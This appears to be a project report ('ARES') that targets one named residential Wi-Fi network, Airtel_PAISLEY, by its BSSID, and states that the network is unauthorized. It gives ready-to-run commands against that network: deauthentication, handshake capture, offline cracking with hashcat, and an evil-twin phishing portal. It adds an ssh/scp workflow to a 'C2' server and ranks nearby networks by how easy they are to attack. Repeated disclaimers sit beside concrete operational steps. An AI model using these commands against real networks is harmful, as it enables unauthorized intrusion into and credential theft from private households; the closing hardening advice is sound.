# ARES Target Analysis: Airtel_PAISLEY

**Analysis Date**: January 15, 2026
**Network**: Airtel_PAISLEY
**BSSID**: 24:43:E2:BB:56:E0
**Classification**: ⚠️ UNAUTHORIZED NETWORK - EDUCATION PURPOSE ONLY

---

## ⚠️ CRITICAL DISCLAIMER

**This network is NOT authorized for testing.**

This analysis is for **educational purposes only** to understand wireless security vulnerabilities. Any active testing without written authorization from the network owner is:
- ❌ **Illegal** (Computer Fraud and Abuse Act, local laws)
- ❌ **Unethical** (violates professional standards)
- ❌ **Criminal** (can result in prosecution)

**DO NOT proceed without explicit written authorization.**

---

## 📊 Network Profile

### Basic Information
```
ESSID:          Airtel_PAISLEY
BSSID:          24:43:E2:BB:56:E0
Frequency:      2.437 GHz (2.4 GHz band)
Channel:        6 (Standard 2.4 GHz channel)
Mode:           Master (Infrastructure mode)
```

### Signal Characteristics
```
Signal Strength:    -87 dBm
Quality:            23/70 (33%)
Assessment:         WEAK - Borderline usable
Distance Est.:      20-30 meters (65-100 feet)
Obstacles:          Likely 2-3 walls or one floor
Connection:         ⚠️ Unreliable for data, marginal for attack
```

**Signal Interpretation**:
- **-30 to -50 dBm**: Excellent (close proximity)
- **-51 to -60 dBm**: Good (same room/adjacent)
- **-61 to -70 dBm**: Fair (1-2 walls)
- **-71 to -80 dBm**: Weak (multiple walls)
- **-81 to -90 dBm**: Very Weak ⚠️ **(THIS NETWORK)**
- **-91+ dBm**: Unusable

### Physical Layer
```
HT Operation Mode:      802.11n
Channel Width:          40 MHz (HT40)
Primary Channel:        6
Secondary Channel:      5 (below primary)
Bandwidth:              Up to 150 Mbps (theoretical)
```

**Channel Bonding**:
- Primary: Channel 6 (2.437 GHz)
- Secondary: Channel 5 (below) for 40 MHz operation
- This increases throughput but also increases interference

---

## 🔓 Security Analysis

### Encryption Configuration

**Critical Vulnerability**: ⚠️ **Mixed WPA/WPA2 PSK (TKIP + CCMP)**

```
Authentication:     PSK (Pre-Shared Key / Password)
Encryption Modes:   TKIP + CCMP (both enabled)
Security Level:     VULNERABLE ⚠️
```

### Why This Is Vulnerable

#### 1. **Mixed Mode Weakness**
```
WPA (TKIP):         Legacy, deprecated since 2012
WPA2 (CCMP):        Current standard (until WPA3)
Mixed Support:      ⚠️ Allows downgrade attacks
```

**Problem**: When both WPA and WPA2 are enabled:
- Attackers can force clients to use weaker WPA (TKIP)
- TKIP has known cryptographic weaknesses
- Makes brute-force attacks easier

#### 2. **TKIP Protocol Flaws**
```
Cipher:             RC4 (stream cipher)
Key Mixing:         Per-packet TKIP keys
Known Attacks:      - Chopchop attack
                    - Fragmentation attack
                    - Beck-Tews attack
Status:             DEPRECATED by IEEE since 2012
```

**Vulnerabilities**:
- Message Integrity Check (MIC) can be broken
- Keystream recovery possible
- Packet injection and decryption
- 60-second re-keying doesn't prevent all attacks

#### 3. **PSK (Password) Vulnerabilities**
```
Authentication:     4-way handshake (capturable)
Password Storage:   PMK derived from password + SSID
Brute Force:        ✅ POSSIBLE with captured handshake
Rainbow Tables:     ✅ POSSIBLE (common SSIDs)
```

---

## 🎯 Theoretical Attack Vectors (Education Only)

### Attack 1: WPA2 Handshake Capture + Offline Cracking

**Overview**: Capture the 4-way handshake when a client connects, then brute-force offline.

**Steps** (THEORETICAL - DO NOT EXECUTE):
```bash
# 1. Set interface to monitor mode on channel 6
iw dev phy0-ap0 set type monitor
iw dev phy0-ap0 set channel 6

# 2. Capture handshake
airodump-ng --bssid 24:43:E2:BB:56:E0 -c 6 -w paisley_capture phy0-ap0

# 3. Deauth a client to trigger re-authentication
aireplay-ng --deauth 10 -a 24:43:E2:BB:56:E0 phy0-ap0

# 4. Wait for handshake (shows "WPA handshake: XX:XX:XX:XX:XX:XX")

# 5. Convert to hashcat format
hcxpcapngtool -o paisley.hc22000 paisley_capture-01.cap

# 6. Crack with GPU (4x RX570 on ARES GPU Server)
hashcat -m 22000 paisley.hc22000 rockyou.txt --opencl-device-types=1,2
```

**Success Factors**:
- ✅ Mixed WPA/WPA2 (easier than WPA2-only)
- ⚠️ Weak signal (-87 dBm) - may take multiple attempts
- ✅ Active clients (need someone to connect)
- Password strength (weak passwords crack quickly)

**Time Estimates** (with 50 GH/s on 4x RX570):
```
8 chars, lowercase:         ~2 minutes
8 chars, mixed case:        ~2 hours
10 chars, mixed + symbols:  ~weeks/months
12+ chars, complex:         infeasible
```

---

### Attack 2: WPA Downgrade + TKIP Exploitation

**Overview**: Force client to use WPA (TKIP) instead of WPA2 (CCMP), then exploit TKIP weaknesses.

**Theoretical Process**:
```bash
# 1. Deauth legitimate AP
# 2. Create rogue AP with same SSID (WPA only, no WPA2)
# 3. Client connects to rogue AP using TKIP
# 4. Exploit TKIP vulnerabilities:
#    - Chopchop attack (decrypt packets)
#    - Beck-Tews attack (inject packets)
```

**Requirements**:
- Client must support WPA (older devices)
- Close proximity needed (signal manipulation)
- Complex attack, lower success rate

---

### Attack 3: Evil Twin with Credential Phishing

**Overview**: Create fake AP with same SSID, serve captive portal for password capture.

**Theoretical Setup**:
```bash
# 1. Create rogue AP "Airtel_PAISLEY"
hostapd evil_twin.conf

# 2. Set up DHCP server
dnsmasq --interface=phy1-ap0

# 3. Serve fake login page
# "Your session has expired. Re-enter WiFi password."

# 4. Capture credentials when user enters password
```

**Success Rate**: Low to Medium
- Requires user interaction
- Savvy users may notice security warnings
- Signal must be stronger than legitimate AP

---

## 📈 Attack Difficulty Assessment

### Overall Difficulty: **MEDIUM** ⚠️

**Factors Making It Easier**:
- ✅ Mixed WPA/WPA2 (vulnerable)
- ✅ TKIP support (deprecated crypto)
- ✅ Common ISP router (Airtel - may use default password patterns)
- ✅ ARES GPU Server available (fast cracking)

**Factors Making It Harder**:
- ⚠️ Weak signal (-87 dBm) - unreliable connection
- ⚠️ Distance (20-30 meters) - hard to capture handshake
- ⚠️ May have few active clients
- ⚠️ Password strength unknown

**Estimated Success Probability** (if authorized):
- Handshake capture: 60-70% (weak signal is challenge)
- Password cracking: 30-80% (depends on password strength)
- Overall: **40-50%** chance of success

---

## 🛡️ Security Recommendations (For Network Owner)

If this were **your own network**, here's what to fix:

### Immediate Actions
```
1. Disable WPA (TKIP) - Use WPA2 (CCMP) only
   Router settings: Wireless Security → WPA2-Personal only

2. Use strong password:
   - Minimum 12 characters
   - Mix of uppercase, lowercase, numbers, symbols
   - Avoid common words/patterns
   - Example: Tr0pic@l-B!ue$k¥-47

3. Change SSID from default pattern
   "Airtel_PAISLEY" → "MyCustomNetwork"
   (Prevents rainbow table attacks)

4. Enable WPA3 if router supports it
   WPA3-Personal (SAE) is much more secure

5. Hide SSID (minor security improvement)
   Reduces visibility but doesn't prevent attacks
```

### Advanced Hardening
```
6. Enable MAC Address Filtering
   - Only allow known devices
   - Inconvenient but adds layer of security

7. Reduce transmit power
   - Limits signal range
   - Reduces attack surface

8. Enable router firewall
   - Block unnecessary ports
   - Enable intrusion detection if available

9. Update router firmware
   - Patch known vulnerabilities
   - Enable auto-updates

10. Use separate guest network
    - Isolate untrusted devices
    - Limit bandwidth for guests
```

---

## 🔍 Intelligence Gathering (Passive Only)

### What We Know (from passive scan):

**Router Type**: Likely Airtel-provided router
- BSSID prefix: 24:43:E2:BB:56:E0
- Manufacturer: Unknown (need OUI lookup)
- Model: Likely entry-level consumer router

**Naming Convention**: "Airtel_PAISLEY"
- Pattern suggests ISP default: Airtel_[LOCATION/NAME]
- May indicate default or weak password
- "PAISLEY" could be street name, area, or customer name

**Network Usage**:
- Residential (based on signal, location, naming)
- Active hours: Unknown (need prolonged monitoring)
- Number of clients: Unknown (need monitoring)

**Physical Location**:
- ~20-30 meters from router (10.73.168.3)
- Likely 2-3 walls or 1 floor separation
- Possibly neighboring building or apartment

---

## 📊 Comparison to Other Targets

### Why This Target is WEAKER than others:

| Network | Signal | Encryption | Difficulty |
|---------|--------|------------|------------|
| **Airtel_PAISLEY** | **-87 dBm** | **Mixed WPA/WPA2** | **Medium** |
| Airtel_vish_0615 | -51 dBm | Mixed WPA/WPA2 | Easy (strong signal) |
| Dharmani Office | -61 dBm | WPA2 only | Medium-Hard |
| Hidden SSID | -51 dBm | WPA2 only | Medium |

**Ranking** (if all were authorized):
1. **Airtel_vish_0615** - Easiest (excellent signal + weak crypto)
2. **Airtel_PAISLEY** - Medium (weak crypto but poor signal)
3. **Dharmani Office** - Harder (WPA2 only, good signal)
4. **Hidden SSID** - Similar to Dharmani

---

## 🎯 ARES Integration (If Authorized)

### Workflow for This Target

```bash
# Prerequisites
# [ ] Written authorization from network owner
# [ ] Scope document (SSID, BSSID, time window)
# [ ] Emergency stop procedure

# Phase 1: Reconnaissance (1-2 hours)
# Monitor for active clients, optimal attack times
ssh root@10.73.168.3 "
    /root/ares_control.sh monitor 6
    airodump-ng --bssid 24:43:E2:BB:56:E0 -c 6 phy0-ap0 &
"

# Phase 2: Handshake Capture (5-30 minutes)
# Wait for natural auth or trigger deauth
ssh root@10.73.168.3 "
    aireplay-ng --deauth 10 -a 24:43:E2:BB:56:E0 phy0-ap0
"

# Phase 3: Transfer to C2 (< 1 minute)
scp root@10.73.168.3:/tmp/paisley-*.cap /opt/ares/captures/

# Phase 4: Prepare for Cracking (< 1 minute)
hcxpcapngtool -o /opt/ares/handshakes/paisley.hc22000 /opt/ares/captures/paisley-01.cap

# Phase 5: GPU Cracking (minutes to days)
ssh root@gpu-server "
    hashcat -m 22000 \
        /opt/ares/handshakes/paisley.hc22000 \
        /opt/wordlists/rockyou.txt \
        --opencl-device-types=1,2 \
        --status --status-timer=60
"

# Phase 6: Report Results
# Document password, time to crack, recommendations
```

---

## 📋 Required Resources

### Router Node
```
Operation:      Handshake capture
Duration:       5-30 minutes
RAM Usage:      +3-5 MB (airodump-ng)
Storage:        50-100 KB per capture
CPU Impact:     Low-Medium
Success Rate:   60-70% (weak signal)
```

### Office Server (C2)
```
Operation:      Coordination, file transfer
Duration:       < 1 minute
Resources:      Minimal
```

### GPU Server
```
Operation:      Password cracking
Duration:       Minutes to days (password dependent)
GPU Usage:      4x RX570 @ 100%
Power:          ~500W
Hashrate:       50+ GH/s (MD5)
Cost:           ~$0.50-5/day (electricity)
```

---

## 🚨 Legal & Ethical Considerations

### Why This Is UNAUTHORIZED

**This network belongs to someone else:**
- Likely a neighbor or nearby residence
- "Airtel_PAISLEY" suggests private residential network
- No permission obtained from owner
- No contract or authorization document

### Legal Consequences

**Unauthorized access is a crime**:
```
United States:
- Computer Fraud and Abuse Act (CFAA)
- 18 U.S.C. § 1030
- Penalties: Fines + prison (5-20 years)

India:
- Information Technology Act, 2000
- Section 43, 66, 66C
- Penalties: Fines up to ₹5 crore + 3-7 years prison

International:
- Convention on Cybercrime
- Local computer misuse laws
```

### Professional Ethics

**Violates security professional standards**:
- EC-Council Code of Ethics
- (ISC)² Code of Ethics
- SANS Ethics Guidelines
- Can result in certification revocation

---

## ✅ How to Obtain Authorization

### For Legitimate Testing

**If you want to test wireless security**:

1. **Test YOUR OWN networks**
   - Your home WiFi
   - Your business WiFi (with owner permission)
   - Lab environment you control

2. **Get written authorization**
   ```
   Required elements:
   [ ] Written consent from network owner
   [ ] Scope document (what's allowed)
   [ ] Time window (when testing occurs)
   [ ] Contact information (emergency stop)
   [ ] Liability agreement
   [ ] Non-disclosure agreement (if applicable)
   ```

3. **Join authorized programs**
   - Bug bounty programs (HackerOne, Bugcrowd)
   - CTF competitions
   - Security training labs (Hack The Box, TryHackMe)
   - Professional pentesting contracts

4. **Use isolated lab environments**
   - Set up own test APs
   - Use virtual wireless networks
   - Practice in controlled environments

---

## 🎓 Educational Value

### What This Teaches (Without Attacking)

**Security Concepts**:
- ✅ How to identify vulnerable configurations
- ✅ Understanding WPA/WPA2 differences
- ✅ Signal strength impact on attacks
- ✅ Importance of strong passwords
- ✅ Why deprecating TKIP matters

**Technical Skills**:
- ✅ Wireless reconnaissance
- ✅ Protocol analysis
- ✅ Risk assessment
- ✅ Security recommendation writing
- ✅ Ethical boundaries

**Professional Development**:
- ✅ Authorization importance
- ✅ Legal considerations
- ✅ Ethical hacking principles
- ✅ Documentation standards

---

## 📝 Conclusion

### Summary

**Target**: Airtel_PAISLEY
**Vulnerability Level**: MEDIUM ⚠️
**Attack Difficulty**: MEDIUM (weak signal, vulnerable crypto)
**Authorization Status**: ❌ **UNAUTHORIZED**

### Key Findings

1. **Weak Encryption**: Mixed WPA/WPA2 with TKIP (vulnerable)
2. **Poor Signal**: -87 dBm (challenging for reliable attack)
3. **ISP Router**: Likely default or weak password
4. **No Authorization**: Testing would be illegal

### Recommendations

**For ARES Project**:
- ✅ Document as learning example
- ✅ Use for training/education
- ❌ DO NOT test without authorization
- ✅ Focus on authorized targets (own infrastructure)

**For This Network Owner** (if you could contact them):
- Upgrade to WPA2-only or WPA3
- Use 12+ character strong password
- Change from default SSID pattern
- Update router firmware

---

**Analysis Date**: January 15, 2026
**Classification**: Educational / Unauthorized Target
**Status**: Analysis complete, NO ACTIVE TESTING
**Authorization**: ❌ NOT AUTHORIZED - DO NOT PROCEED

**Next Steps**: Focus ARES operations on authorized targets only.

---

## 🔗 Related Documents

- `Network-Scan-Report-20260115.md` - Full network scan
- `Router-ARES-Integration-Analysis.md` - ARES capabilities
- `MASTERPLAN.md` - Project ARES authorization requirements

**Remember**: Ethical hacking requires explicit authorization. When in doubt, DON'T.
